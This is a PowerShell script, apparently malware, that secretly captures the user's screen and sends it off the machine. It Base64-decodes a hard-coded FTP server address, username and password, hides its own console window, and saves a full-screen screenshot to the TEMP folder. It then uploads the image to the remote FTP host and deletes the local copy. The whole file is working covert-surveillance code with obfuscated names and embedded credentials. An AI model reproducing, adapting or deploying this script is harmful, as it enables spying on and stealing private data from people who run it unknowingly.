$x1 = @{
    p = "MMF"    
}

$x2 = @{
    a1 = "ZnRwOi8vZnRwdXBsb2FkLm5ldC9odGRvY3Mv"
    a2 = "aWYwXzQyMTk3NTg5"
    a3 = "eWhrcmVPQWZ6Vk04TWU="
}

function f1 {
    param([string]$d)
    try {
        $b = [System.Convert]::FromBase64String($d)
        return [System.Text.Encoding]::UTF8.GetString($b)
    } catch { return $null }
}

$r = @{
    s = f1 $x2.a1
    u = f1 $x2.a2
    p = f1 $x2.a3
    e = "png"
    t = $env:TEMP
}

function f2 {
    $ts = Get-Date -Format "MMdd-HHmm"
    $fn = "$($x1.p)$ts.$($r.e)"
    $fp = Join-Path $r.t $fn
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        if (-not ('z1' -as [type])) {
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public class z1 {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
"@
        }
        [z1]::SetProcessDPIAware() | Out-Null

        $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $w = $sc.Width
        $h = $sc.Height

        if ($w -le 0 -or $h -le 0) {
            return $null
        }

        $bm = New-Object System.Drawing.Bitmap $w, $h
        $gr = [System.Drawing.Graphics]::FromImage($bm)
        $gr.CopyFromScreen($sc.Left, $sc.Top, 0, 0, $bm.Size)
        $bm.Save($fp, [System.Drawing.Imaging.ImageFormat]::Png)
        $gr.Dispose()
        $bm.Dispose()
        
        if (Test-Path $fp) {
            return @{ x = $fp; y = $fn }
        }
    }
    catch {
    }
    return $null
}

function f3 {
    param($l, $m)
    
    if (-not $l -or -not (Test-Path $l)) { return $false }
    
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Credentials = New-Object System.Net.NetworkCredential($r.u, $r.p)
        $wc.UploadFile($r.s + $m, "STOR", $l)
        return $true
    }
    catch {
        return $false
    }
    finally {
        if ($wc) { $wc.Dispose() }
    }
}

try {
    $wcd = @'
using System;
using System.Runtime.InteropServices;
public class z2 {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
'@
    Add-Type -TypeDefinition $wcd
    $ch = [z2]::GetConsoleWindow()
    [z2]::ShowWindow($ch, 0)
}
catch {
}

Start-Sleep -Seconds 5

$cr = f2

if ($cr) {
    $ur = f3 -l $cr.x -m $cr.y
    
    if (Test-Path $cr.x) {
        Remove-Item $cr.x -Force -ErrorAction SilentlyContinue
    }
}